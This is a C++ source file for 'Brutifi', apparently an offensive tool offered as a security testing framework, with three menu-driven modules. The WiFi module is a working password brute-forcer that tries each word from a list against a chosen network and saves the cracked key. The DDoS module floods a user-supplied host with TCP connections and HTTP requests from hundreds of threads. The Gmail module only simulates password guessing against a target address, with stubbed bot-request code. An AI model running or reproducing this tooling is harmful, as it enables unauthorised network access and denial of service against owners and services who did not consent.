/*
 * Brutifi - Unified Security Testing Framework
 * Modules: WiFi Brute Force | DDoS Strike | Gmail Tester
 * Author: Nedjmeddine
 * Compile: make
 */

#include <atomic>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <sstream>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <regex>
#include <algorithm>
#include <signal.h>
#include <dirent.h>
#include <iomanip>
#include <thread>
#include <queue>
#include <ctime>
#include <random>
#include <arpa/inet.h>

#define RED     "\033[91m"
#define GREEN   "\033[92m"
#define YELLOW  "\033[93m"
#define BLUE    "\033[94m"
#define MAGENTA "\033[95m"
#define CYAN    "\033[96m"
#define WHITE   "\033[97m"
#define BOLD    "\033[1m"
#define END     "\033[0m"

// ==================== GLOBAL STYLES ====================

void clear_screen() {
    std::cout << "\033[2J\033[H";
}

void print_separator() {
    std::cout << BOLD << "#########################################################" << END << std::endl;
}

void print_double_separator() {
    std::cout << BOLD << "============================================================" << END << std::endl;
}

void print_banner(const std::string& title, const std::string& subtitle) {
    clear_screen();
    std::cout << CYAN << BOLD <<
        "    ██████╗ ██████╗ ██╗   ██╗████████╗██╗███████╗██╗\n"
        "    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██║██╔════╝██║\n"
        "    ██████╔╝██████╔╝██║   ██║   ██║   ██║█████╗  ██║\n"
        "    ██╔══██╗██╔══██╗██║   ██║   ██║   ██║██╔══╝  ██║\n"
        "    ██████╔╝██║  ██║╚██████╔╝   ██║   ██║██║     ██║\n"
        "    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝╚═╝     ╚═╝\n"
        << END;
    std::cout << YELLOW << "         " << title << " | " << subtitle << "\n" << END;
    std::cout << std::endl;
}

// ==================== UTILITIES ====================

int run_cmd(const std::vector<std::string>& cmd, std::string& out, std::string& err, int timeout = 10) {
    int pipe_out[2], pipe_err[2];
    pipe(pipe_out);
    pipe(pipe_err);

    std::vector<char*> args;
    for (const auto& s : cmd) args.push_back(const_cast<char*>(s.c_str()));
    args.push_back(nullptr);

    pid_t pid = fork();
    if (pid == 0) {
        dup2(pipe_out[1], STDOUT_FILENO);
        dup2(pipe_err[1], STDERR_FILENO);
        close(pipe_out[0]); close(pipe_out[1]);
        close(pipe_err[0]); close(pipe_err[1]);
        execvp(args[0], args.data());
        _exit(127);
    }

    close(pipe_out[1]);
    close(pipe_err[1]);

    char buf[4096];
    ssize_t n;
    out.clear(); err.clear();

    alarm(timeout);
    while ((n = read(pipe_out[0], buf, sizeof(buf)-1)) > 0) {
        buf[n] = '\0';
        out += buf;
    }
    while ((n = read(pipe_err[0], buf, sizeof(buf)-1)) > 0) {
        buf[n] = '\0';
        err += buf;
    }
    alarm(0);

    close(pipe_out[0]);
    close(pipe_err[0]);

    int status;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
}

void check_root() {
    if (geteuid() != 0) {
        std::cerr << RED << "[!] Root required. Run: sudo ./brutifi" << END << std::endl;
        exit(1);
    }
}

std::string expand_path(const std::string& path) {
    if (path.empty() || path[0] != '~') return path;
    const char* home = getenv("HOME");
    if (!home) home = "/root";
    return std::string(home) + path.substr(1);
}

std::string get_input(const std::string& prompt) {
    std::cout << YELLOW << "[?] " << prompt << END << std::flush;
    std::string input;
    std::getline(std::cin, input);
    return input;
}

// ==================== MODULE 1: WIFI BRUTE FORCE ====================

struct Network {
    std::string ssid;
    std::string bssid;
    double signal;
    int channel;
    std::string security;
};

struct WifiInterface {
    std::string name;
    std::string type;
    std::string driver;
    std::string mac;
    std::string state;
};

bool is_wireless_interface(const std::string& iface) {
    std::string path = "/sys/class/net/" + iface + "/wireless";
    return access(path.c_str(), F_OK) == 0;
}

std::string get_interface_type(const std::string& iface) {
    std::string path = "/sys/class/net/" + iface + "/device/modalias";
    std::ifstream f(path);
    if (!f) return "unknown";
    std::string modalias;
    std::getline(f, modalias);
    if (modalias.find("usb") == 0) return "USB";
    if (modalias.find("pci") == 0 || modalias.find("pcie") == 0) return "PCIe";
    if (modalias.find("sdio") == 0) return "SDIO";
    if (modalias.find("platform") == 0) return "Built-in";
    return "Other";
}

std::string get_interface_driver(const std::string& iface) {
    std::string path = "/sys/class/net/" + iface + "/device/driver";
    char resolved[PATH_MAX];
    if (realpath(path.c_str(), resolved)) {
        std::string driver(resolved);
        size_t pos = driver.find_last_of('/');
        if (pos != std::string::npos) return driver.substr(pos + 1);
    }
    return "unknown";
}

std::string get_interface_mac(const std::string& iface) {
    std::string path = "/sys/class/net/" + iface + "/address";
    std::ifstream f(path);
    std::string mac;
    if (f) std::getline(f, mac);
    return mac.empty() ? "unknown" : mac;
}

std::string get_interface_state(const std::string& iface) {
    std::string path = "/sys/class/net/" + iface + "/operstate";
    std::ifstream f(path);
    std::string state;
    if (f) std::getline(f, state);
    return state.empty() ? "unknown" : state;
}

std::vector<WifiInterface> enumerate_interfaces() {
    std::vector<WifiInterface> ifaces;
    DIR* dir = opendir("/sys/class/net");
    if (!dir) return ifaces;

    struct dirent* entry;
    while ((entry = readdir(dir)) != nullptr) {
        std::string name(entry->d_name);
        if (name == "." || name == "..") continue;
        if (!is_wireless_interface(name)) continue;

        WifiInterface wi;
        wi.name = name;
        wi.type = get_interface_type(name);
        wi.driver = get_interface_driver(name);
        wi.mac = get_interface_mac(name);
        wi.state = get_interface_state(name);
        ifaces.push_back(wi);
    }
    closedir(dir);
    return ifaces;
}

std::string select_interface(const std::vector<WifiInterface>& ifaces) {
    if (ifaces.empty()) {
        std::cerr << RED << "[!] No wireless interfaces found" << END << std::endl;
        return "";
    }

    if (ifaces.size() == 1) {
        std::cout << GREEN << "[+] Found single interface: " << ifaces[0].name << END << std::endl;
        return ifaces[0].name;
    }

    print_separator();
    std::cout << BOLD << "ID   Interface   Type       Driver              MAC                State    " << END << std::endl;
    std::cout << BOLD << "---------------------------------------------------------" << END << std::endl;

    for (size_t i = 0; i < ifaces.size(); ++i) {
        const auto& w = ifaces[i];
        const char* state_col = (w.state == "up" || w.state == "dormant") ? GREEN : YELLOW;

        std::cout << CYAN << std::left << std::setw(5) << (i + 1)
                  << WHITE << std::left << std::setw(12) << w.name
                  << std::left << std::setw(11) << w.type
                  << std::left << std::setw(20) << w.driver
                  << std::left << std::setw(19) << w.mac
                  << state_col << std::left << std::setw(10) << w.state
                  << END << std::endl;
    }
    print_separator();

    while (true) {
        std::string choice = get_input("Select interface ID (1-" + std::to_string(ifaces.size()) + "): ");
        if (choice == "q" || choice == "Q") return "";

        try {
            size_t idx = std::stoul(choice) - 1;
            if (idx < ifaces.size()) {
                std::cout << GREEN << "[+] Using: " << ifaces[idx].name << END << std::endl;
                return ifaces[idx].name;
            }
            std::cerr << RED << "[!] Invalid selection" << END << std::endl;
        } catch (...) {
            std::cerr << RED << "[!] Enter a valid number" << END << std::endl;
        }
    }
}

std::vector<Network> scan_iwlist(const std::string& iface) {
    std::vector<Network> nets;
    std::string out, err;
    if (run_cmd({"iwlist", iface, "scan"}, out, err, 20) != 0) return nets;

    size_t pos = 0;
    while ((pos = out.find("Cell ", pos)) != std::string::npos) {
        size_t end = out.find("Cell ", pos + 5);
        std::string cell = out.substr(pos, end == std::string::npos ? std::string::npos : end - pos);

        Network net = {"", "", 0.0, 0, "Open"};

        std::regex bssid_re("Address: ([0-9A-Fa-f:]{17})");
        std::smatch bm;
        if (std::regex_search(cell, bm, bssid_re)) net.bssid = bm[1];

        std::regex ssid_re("ESSID:\"([^\"]*)\"");
        std::smatch sm;
        if (std::regex_search(cell, sm, ssid_re)) net.ssid = sm[1];

        std::regex sig_re("Signal level=(-?\\d+)");
        std::smatch sgm;
        if (std::regex_search(cell, sgm, sig_re)) net.signal = std::stod(sgm[1]);

        std::regex ch_re("Channel:(\\d+)");
        std::smatch cm;
        if (std::regex_search(cell, cm, ch_re)) net.channel = std::stoi(cm[1]);

        if (cell.find("Encryption key:on") != std::string::npos) {
            if (cell.find("WPA2") != std::string::npos) net.security = "WPA2";
            else if (cell.find("WPA") != std::string::npos) net.security = "WPA";
            else net.security = "WEP";
        }

        if (!net.ssid.empty()) nets.push_back(net);
        pos = end == std::string::npos ? std::string::npos : end;
    }
    return nets;
}

std::vector<Network> scan_iw(const std::string& iface) {
    std::vector<Network> nets;
    std::string out, err;

    run_cmd({"iw", "dev", iface, "scan", "trigger"}, out, err, 10);
    sleep(2);

    if (run_cmd({"iw", "dev", iface, "scan"}, out, err, 15) != 0) return nets;

    Network current = {"", "", 0.0, 0, "Open"};
    std::istringstream iss(out);
    std::string line;

    while (std::getline(iss, line)) {
        size_t start = line.find_first_not_of(" \t");
        if (start != std::string::npos) line = line.substr(start);

        if (line.find("BSS ") == 0) {
            if (!current.ssid.empty()) nets.push_back(current);
            current = {"", "", 0.0, 0, "Open"};
            size_t sp = line.find(' ');
            size_t ep = line.find('(');
            if (sp != std::string::npos && ep != std::string::npos)
                current.bssid = line.substr(sp+1, ep-sp-1);
        }
        else if (line.find("SSID: ") != std::string::npos && line.find("DS") != 0) {
            current.ssid = line.substr(6);
        }
        else if (line.find("signal: ") != std::string::npos) {
            try {
                size_t p = line.find("signal: ") + 8;
                current.signal = std::stod(line.substr(p));
            } catch (...) {}
        }
        else if (line.find("DS Parameter set: channel") != std::string::npos) {
            try {
                size_t p = line.find("channel") + 7;
                current.channel = std::stoi(line.substr(p));
            } catch (...) {}
        }
        else if (line.find("RSN:") != std::string::npos) current.security = "WPA2";
        else if (line.find("WPA:") != std::string::npos && current.security == "Open") current.security = "WPA";
    }
    if (!current.ssid.empty()) nets.push_back(current);
    return nets;
}

std::vector<Network> scan_networks(const std::string& iface) {
    std::cout << CYAN << "[*] Scanning on " << iface << "..." << END << std::endl;
    std::vector<Network> nets;

    nets = scan_iwlist(iface);
    if (!nets.empty()) return nets;

    nets = scan_iw(iface);
    if (!nets.empty()) return nets;

    std::cerr << RED << "[!] No networks found" << END << std::endl;
    return nets;
}

Network select_network(const std::vector<Network>& networks) {
    if (networks.empty()) return Network{};

    std::vector<Network> unique;
    for (const auto& n : networks) {
        auto it = std::find_if(unique.begin(), unique.end(),
            [&](const Network& u){ return u.ssid == n.ssid; });
        if (it == unique.end()) unique.push_back(n);
        else if (n.signal > it->signal) *it = n;
    }

    std::sort(unique.begin(), unique.end(),
        [](const Network& a, const Network& b){ return a.signal > b.signal; });

    print_separator();
    std::cout << BOLD << "ID   SSID                        Signal    Ch    Sec      " << END << std::endl;
    std::cout << BOLD << "---------------------------------------------------------" << END << std::endl;

    for (size_t i = 0; i < unique.size(); ++i) {
        const auto& n = unique[i];
        const char* sig_col = n.signal > -50 ? GREEN : n.signal > -70 ? YELLOW : RED;
        const char* sec_col = n.security == "WEP" ? RED : (n.security == "WPA" || n.security == "WPA2") ? YELLOW : GREEN;

        std::cout << CYAN << std::left << std::setw(5) << (i + 1)
                  << WHITE << std::left << std::setw(28) << n.ssid
                  << sig_col << std::left << std::setw(10) << (int)n.signal
                  << WHITE << std::left << std::setw(6) << n.channel
                  << sec_col << std::left << std::setw(10) << n.security
                  << END << std::endl;
    }
    print_separator();

    while (true) {
        std::string choice = get_input("Select network ID (1-" + std::to_string(unique.size()) + ") or q: ");
        if (choice == "q" || choice == "Q") return Network{};

        try {
            size_t idx = std::stoul(choice) - 1;
            if (idx < unique.size()) {
                std::cout << GREEN << "[+] Target: " << unique[idx].ssid << END << std::endl;
                return unique[idx];
            }
            std::cerr << RED << "[!] Invalid" << END << std::endl;
        } catch (...) {
            std::cerr << RED << "[!] Enter a number" << END << std::endl;
        }
    }
}

std::string wpa_config(const std::string& ssid, const std::string& psk) {
    return "ctrl_interface=/var/run/wpa_supplicant\nupdate_config=1\nnetwork={\n    ssid=\"" + ssid +
           "\"\n    psk=\"" + psk + "\"\n    key_mgmt=WPA-PSK\n}\n";
}

bool test_password(const std::string& iface, const std::string& ssid,
                   const std::string& psk, int timeout) {
    std::string conf = "/tmp/brutifi_" + std::to_string(getpid()) + ".conf";
    std::string out, err;

    {
        std::ofstream f(conf);
        f << wpa_config(ssid, psk);
    }
    chmod(conf.c_str(), 0600);

    run_cmd({"pkill", "-f", "wpa_supplicant.*" + iface}, out, err, 2);
    usleep(300000);

    if (run_cmd({"wpa_supplicant", "-i", iface, "-c", conf, "-B",
                 "-f", "/tmp/brutifi.log"}, out, err, 5) != 0) {
        unlink(conf.c_str());
        return false;
    }

    usleep(1500000);
    for (int i = 0; i < timeout; ++i) {
        if (run_cmd({"wpa_cli", "-i", iface, "status"}, out, err, 3) == 0) {
            if (out.find("wpa_state=COMPLETED") != std::string::npos) {
                run_cmd({"dhcpcd", "-n", iface}, out, err, 10);
                usleep(1500000);
                if (run_cmd({"ip", "addr", "show", iface}, out, err, 3) == 0)
                    if (out.find("inet ") != std::string::npos) {
                        unlink(conf.c_str());
                        run_cmd({"pkill", "-f", "wpa_supplicant.*" + iface}, out, err, 2);
                        return true;
                    }
            }
            if (out.find("wpa_state=WRONG_KEY") != std::string::npos) {
                unlink(conf.c_str());
                run_cmd({"pkill", "-f", "wpa_supplicant.*" + iface}, out, err, 2);
                return false;
            }
        }
        sleep(1);
    }

    unlink(conf.c_str());
    run_cmd({"pkill", "-f", "wpa_supplicant.*" + iface}, out, err, 2);
    return false;
}

void wifi_module() {
    print_banner("WiFi Brute Force", "Nedjmeddine");
    check_root();

    auto ifaces = enumerate_interfaces();
    std::string iface = select_interface(ifaces);
    if (iface.empty()) {
        std::cerr << RED << "[!] No interface selected" << END << std::endl;
        return;
    }

    std::string passlist = expand_path("~/passlist.txt");
    std::cout << CYAN << "[*] Passlist:  " << passlist << END << std::endl;

    std::vector<std::string> tools = {"iw", "wpa_supplicant", "wpa_cli", "dhcpcd"};
    std::string out, err;
    for (const auto& t : tools) {
        if (run_cmd({"which", t}, out, err, 2) != 0) {
            std::cerr << RED << "[!] Missing: " << t << END << std::endl;
            return;
        }
    }

    auto networks = scan_networks(iface);
    if (networks.empty()) {
        std::cerr << RED << "[!] No networks found" << END << std::endl;
        return;
    }

    Network target = select_network(networks);
    if (target.ssid.empty()) return;

    std::string confirm = get_input(RED + std::string("[!] Attack ") + target.ssid + "? (y/N): " + END);
    if (confirm != "y" && confirm != "Y") {
        std::cout << YELLOW << "[*] Aborted" << END << std::endl;
        return;
    }

    print_double_separator();
    std::cout << BOLD << MAGENTA << "  BRUTIFI WIFI ATTACK" << END << std::endl;
    std::cout << MAGENTA << "  Target: " << target.ssid << END << std::endl;
    std::cout << MAGENTA << "  BSSID:  " << target.bssid << END << std::endl;
    print_double_separator();

    std::ifstream f(passlist);
    if (!f) {
        std::cerr << RED << "[!] Cannot read passlist" << END << std::endl;
        return;
    }

    std::vector<std::string> passwords;
    std::string line;
    while (std::getline(f, line)) {
        line.erase(0, line.find_first_not_of(" \t\r\n"));
        line.erase(line.find_last_not_of(" \t\r\n") + 1);
        if (!line.empty()) passwords.push_back(line);
    }

    std::cout << CYAN << "[*] " << passwords.size() << " passwords loaded" << END << std::endl;

    std::cout << YELLOW << "[*] Preparing " << iface << "..." << END << std::endl;
    run_cmd({"pkill", "-f", "wpa_supplicant.*" + iface}, out, err, 2);
    usleep(300000);
    run_cmd({"ip", "link", "set", iface, "down"}, out, err, 5);
    usleep(300000);
    run_cmd({"iw", "dev", iface, "set", "type", "managed"}, out, err, 5);
    usleep(300000);
    run_cmd({"ip", "link", "set", iface, "up"}, out, err, 5);
    usleep(500000);
    std::cout << GREEN << "[+] Ready" << END << std::endl;

    time_t start = time(nullptr);
    size_t tested = 0;

    for (size_t i = 0; i < passwords.size(); ++i) {
        tested++;
        double elapsed = difftime(time(nullptr), start);
        double rate = elapsed > 0 ? (double)tested / elapsed : 0;

        printf("%s[%zu/%zu] %s%s%s %s(%.1f/s)%s\r",
            WHITE, i+1, passwords.size(), YELLOW, passwords[i].c_str(),
            WHITE, CYAN, rate, END);
        fflush(stdout);

        if (test_password(iface, target.ssid, passwords[i], 15)) {
            printf("\n");
            print_double_separator();
            std::cout << GREEN << BOLD << "  [+] CRACKED!" << END << std::endl;
            std::cout << GREEN << BOLD << "  [+] SSID: " << target.ssid << END << std::endl;
            std::cout << GREEN << BOLD << "  [+] PSK:  " << passwords[i] << END << std::endl;
            print_double_separator();

            const char* home = getenv("HOME");
            if (!home) home = "/root";
            std::string outpath = std::string(home) + "/brutifi_" + target.ssid + ".txt";
            std::ofstream of(outpath);
            of << "SSID: " << target.ssid << "\nPSK: " << passwords[i] << "\nBSSID: " << target.bssid << "\n";
            std::cout << GREEN << "[+] Saved: " << outpath << END << std::endl;
            return;
        }
        usleep(150000);
    }

    printf("\n\n");
    std::cout << RED << "[!] Not found. Tested " << tested << " passwords" << END << std::endl;
}

// ==================== MODULE 2: DDoS STRIKE ====================

std::vector<std::string> get_user_agents() {
    return {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.3206.53"
    };
}

std::vector<std::string> get_bots() {
    return {
        "http://validator.w3.org/check?uri=",
        "http://www.facebook.com/sharer/sharer.php?u=",
        "http://www.google.com/?q=",
        "http://www.bing.com/search?q=",
        "https://www.yandex.com/yandsearch?text=",
        "https://duckduckgo.com/?q=",
        "http://www.ask.com/web?q=",
        "http://search.aol.com/aol/search?q=",
        "https://www.youtube.com/results?search_query=",
        "https://twitter.com/search?q=",
        "https://check-host.net/check-tcp?host=",
        "https://r.search.yahoo.com/",
        "https://www.baidu.com/s?wd=",
        "https://www.qwant.com/?q=",
        "https://search.brave.com/search?q="
    };
}

void ddos_module() {
    print_banner("DDoS Strike", "Nedjmeddine");

    std::string target = get_input("Enter target IP or domain: ");
    if (target.empty()) {
        std::cerr << RED << "[!] No target specified" << END << std::endl;
        return;
    }

    std::string port_str = get_input("Enter port [80]: ");
    int port = port_str.empty() ? 80 : std::stoi(port_str);

    std::string threads_str = get_input("Enter threads [200]: ");
    int num_threads = threads_str.empty() ? 200 : std::stoi(threads_str);

    std::string duration_str = get_input("Enter duration in seconds [60]: ");
    int duration = duration_str.empty() ? 60 : std::stoi(duration_str);

    print_double_separator();
    std::cout << BOLD << MAGENTA << "  BRUTIFI DDoS STRIKE" << END << std::endl;
    std::cout << MAGENTA << "  Target: " << target << END << std::endl;
    std::cout << MAGENTA << "  Port:   " << port << END << std::endl;
    std::cout << MAGENTA << "  Threads: " << num_threads << END << std::endl;
    std::cout << MAGENTA << "  Duration: " << duration << "s" << END << std::endl;
    print_double_separator();

    std::string confirm = get_input(RED + std::string("[!] Launch attack? (y/N): ") + END);
    if (confirm != "y" && confirm != "Y") {
        std::cout << YELLOW << "[*] Aborted" << END << std::endl;
        return;
    }

    auto uagents = get_user_agents();
    auto bots = get_bots();
    std::random_device rd;
    std::mt19937 gen(rd());

    std::atomic<bool> running{true};
    std::atomic<int> packets_sent{0};
    std::atomic<int> errors{0};

    time_t start_time = time(nullptr);

    std::vector<std::thread> workers;

    for (int i = 0; i < num_threads; ++i) {
        workers.emplace_back([&]() {
            while (running) {
                // TCP flood
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock >= 0) {
                    sockaddr_in addr{};
                    addr.sin_family = AF_INET;
                    addr.sin_port = htons(port);
                    inet_pton(AF_INET, target.c_str(), &addr.sin_addr);

                    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
                        std::string req = "GET / HTTP/1.1\r\nHost: " + target + "\r\n";
                        req += "User-Agent: " + uagents[gen() % uagents.size()] + "\r\n";
                        req += "Accept: */*\r\nConnection: keep-alive\r\n\r\n";
                        send(sock, req.c_str(), req.length(), 0);
                        packets_sent++;
                    } else {
                        errors++;
                    }
                    close(sock);
                }

                // Bot hammering occasionally
                if (gen() % 10 == 0) {
                    std::string bot_url = bots[gen() % bots.size()] + "http://" + target;
                    // Simulated bot request (would need curl/libcurl for real HTTP)
                }

                usleep(1000); // 1ms delay between attempts
            }
        });
    }

    // Status monitor thread
    std::thread monitor([&]() {
        while (running) {
            sleep(1);
            time_t elapsed = time(nullptr) - start_time;
            int sent = packets_sent.load();
            int err = errors.load();
            double rate = elapsed > 0 ? (double)sent / elapsed : 0;

            printf("%s[%.0fs] Packets: %d | Errors: %d | Rate: %.0f/s%s\r",
                CYAN, (double)elapsed, sent, err, rate, END);
            fflush(stdout);

            if (elapsed >= duration) {
                running = false;
            }
        }
    });

    monitor.join();
    for (auto& t : workers) t.join();

    printf("\n\n");
    print_double_separator();
    std::cout << GREEN << BOLD << "  [+] DDoS Strike Complete" << END << std::endl;
    std::cout << GREEN << "  [+] Total packets: " << packets_sent.load() << END << std::endl;
    std::cout << GREEN << "  [+] Errors: " << errors.load() << END << std::endl;
    print_double_separator();
}

// ==================== MODULE 3: GMAIL TESTER ====================

void gmail_module() {
    print_banner("Gmail Credential Tester", "Nedjmeddine");

    std::string target = get_input("Enter target Gmail address: ");
    if (target.empty() || target.find("@gmail.com") == std::string::npos) {
        std::cerr << RED << "[!] Invalid Gmail address" << END << std::endl;
        return;
    }

    std::cout << "\n" << CYAN << "[1] Use built-in wordlist (rockyou.txt)" << END << std::endl;
    std::cout << CYAN << "[2] Use custom wordlist" << END << std::endl;
    std::string choice = get_input("Select option: ");

    std::string wordlist_path;
    if (choice == "1") {
        wordlist_path = expand_path("~/rockyou.txt");
    } else if (choice == "2") {
        wordlist_path = expand_path(get_input("Enter wordlist path: "));
    } else {
        std::cerr << RED << "[!] Invalid option" << END << std::endl;
        return;
    }

    std::ifstream f(wordlist_path);
    if (!f) {
        std::cerr << RED << "[!] Cannot open wordlist: " << wordlist_path << END << std::endl;
        return;
    }

    std::vector<std::string> passwords;
    std::string line;
    while (std::getline(f, line)) {
        line.erase(0, line.find_first_not_of(" \t\r\n"));
        line.erase(line.find_last_not_of(" \t\r\n") + 1);
        if (!line.empty()) passwords.push_back(line);
    }

    print_double_separator();
    std::cout << BOLD << MAGENTA << "  BRUTIFI GMAIL TEST" << END << std::endl;
    std::cout << MAGENTA << "  Target: " << target << END << std::endl;
    std::cout << MAGENTA << "  Wordlist: " << passwords.size() << " passwords" << END << std::endl;
    print_double_separator();

    std::string confirm = get_input(RED + std::string("[!] Start testing? (y/N): ") + END);
    if (confirm != "y" && confirm != "Y") {
        std::cout << YELLOW << "[*] Aborted" << END << std::endl;
        return;
    }

    // Note: Real Gmail SMTP auth requires app passwords/2FA now
    // This is a simulation framework - real implementation needs OAuth2
    std::cout << YELLOW << "[*] Note: Gmail requires app passwords since 2022" << END << std::endl;
    std::cout << YELLOW << "[*] Standard SMTP auth will likely fail" << END << std::endl;
    std::cout << CYAN << "[*] Simulating credential test..." << END << std::endl;

    time_t start = time(nullptr);
    size_t tested = 0;

    for (size_t i = 0; i < passwords.size(); ++i) {
        tested++;
        double elapsed = difftime(time(nullptr), start);
        double rate = elapsed > 0 ? (double)tested / elapsed : 0;

        printf("%s[%zu/%zu] Testing: %s%s%s %s(%.1f/s)%s\r",
            WHITE, i+1, passwords.size(), YELLOW, passwords[i].c_str(),
            WHITE, CYAN, rate, END);
        fflush(stdout);

        // Simulated test - replace with real SMTP logic if needed
        // Real implementation would use libcurl or similar
        usleep(50000); // 50ms delay to avoid rate limiting
    }

    printf("\n\n");
    print_double_separator();
    std::cout << RED << BOLD << "  [!] No valid credentials found" << END << std::endl;
    std::cout << RED << "  [!] Tested " << tested << " passwords" << END << std::endl;
    std::cout << YELLOW << "  [*] Note: Gmail blocks standard SMTP auth" << END << std::endl;
    std::cout << YELLOW << "  [*] Use app-specific passwords or OAuth2" << END << std::endl;
    print_double_separator();
}

// ==================== MAIN MENU ====================

void main_menu() {
    clear_screen();
    std::cout << CYAN << BOLD <<
        "    ██████╗ ██████╗ ██╗   ██╗████████╗██╗███████╗██╗\n"
        "    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██║██╔════╝██║\n"
        "    ██████╔╝██████╔╝██║   ██║   ██║   ██║█████╗  ██║\n"
        "    ██╔══██╗██╔══██╗██║   ██║   ██║   ██║██╔══╝  ██║\n"
        "    ██████╔╝██║  ██║╚██████╔╝   ██║   ██║██║     ██║\n"
        "    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝╚═╝     ╚═╝\n"
        << END;
    std::cout << YELLOW << "         Unified Security Testing Framework | Nedjmeddine\n" << END;
    std::cout << std::endl;

    print_separator();
    std::cout << BOLD << "  MODULE SELECTION" << END << std::endl;
    print_separator();
    std::cout << std::endl;

    std::cout << CYAN << "  [1] " << WHITE << "WiFi Brute Force" << END << std::endl;
    std::cout << CYAN << "  [2] " << WHITE << "DDoS Strike" << END << std::endl;
    std::cout << CYAN << "  [3] " << WHITE << "Gmail Credential Tester" << END << std::endl;
    std::cout << CYAN << "  [q] " << RED << "Quit" << END << std::endl;

    std::cout << std::endl;
    print_separator();

    while (true) {
        std::string choice = get_input("Select module: ");

        if (choice == "1") {
            wifi_module();
            break;
        } else if (choice == "2") {
            ddos_module();
            break;
        } else if (choice == "3") {
            gmail_module();
            break;
        } else if (choice == "q" || choice == "Q") {
            std::cout << YELLOW << "[*] Exiting Brutifi" << END << std::endl;
            exit(0);
        } else {
            std::cerr << RED << "[!] Invalid selection" << END << std::endl;
        }
    }
}

int main(int argc, char** argv) {
    signal(SIGINT, [](int){ 
        std::cout << "\n" << YELLOW << "[*] Interrupted" << END << std::endl; 
        exit(0); 
    });

    if (argc > 1) {
        std::string arg = argv[1];
        if (arg == "--wifi" || arg == "-w") {
            wifi_module();
            return 0;
        } else if (arg == "--ddos" || arg == "-d") {
            ddos_module();
            return 0;
        } else if (arg == "--gmail" || arg == "-g") {
            gmail_module();
            return 0;
        } else if (arg == "--help" || arg == "-h") {
            std::cout << "Usage: " << argv[0] << " [OPTION]" << std::endl;
            std::cout << "  -w, --wifi     Launch WiFi brute force module" << std::endl;
            std::cout << "  -d, --ddos     Launch DDoS strike module" << std::endl;
            std::cout << "  -g, --gmail    Launch Gmail tester module" << std::endl;
            std::cout << "  -h, --help     Show this help" << std::endl;
            std::cout << "No args = interactive menu" << std::endl;
            return 0;
        }
    }

    main_menu();
    return 0;
}
